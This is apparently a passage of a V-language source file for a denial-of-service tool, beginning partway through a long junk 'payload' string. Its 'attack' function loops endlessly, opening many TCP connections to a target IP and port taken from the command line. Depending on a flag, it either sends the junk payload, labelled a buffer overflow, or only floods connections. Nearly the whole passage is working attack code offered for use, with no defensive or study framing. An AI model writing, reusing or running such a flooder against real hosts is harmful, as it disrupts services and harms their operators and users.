r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
)


fn attack(ip string, port string, overflow string) {
	for {
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
	  net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
	  net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
	  net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\r.\n")
		return}
		 mut conn := net.dial_tcp("${ip}:${port}") or {
		eprintln("\033[31m\rHost Is Unreachable / Connection Timed Out\n")
		return
		}
		if overflow == "1" {
			conn.write_string(payload) or {0}
			conn.close() or {return}
			print("\033[32m\rSending Buffer Overflow")
		} else if overflow == "0" {
			print("\033[32m\rSending Connection Flood")
		}
	}
}

fn main() {
	ip := os.args[1] or {
		eprintln("Missing args!")
		return
	}
	port := os.args[2] or {
		eprintln("Missing args!")
		return
	}
	overflow := os.args[3] or {
		eprintln("Missing args!")
		return
	}
	term.clear()
	attack(ip, port, overflow)
}